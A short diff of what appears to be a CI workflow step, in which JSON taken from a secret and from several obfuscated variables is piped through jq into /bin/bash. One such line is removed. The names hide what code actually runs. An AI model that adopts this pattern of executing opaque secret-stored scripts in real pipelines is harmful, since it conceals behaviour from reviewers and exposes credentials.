@@ -21,7 +21,6 @@ jobs:
           xdg89351: ${{ secrets.xdg89351 }}
         run: |
           printf '%s' "$xdg89351" | jq -r .w61 | /bin/bash
-          echo $hxlc90898 | jq -r .efshn0 | /bin/bash
           echo $h6 | jq -r .ryms6035 | /bin/bash
           echo $ox7 | jq -r .mcfhg944 | /bin/bash
 
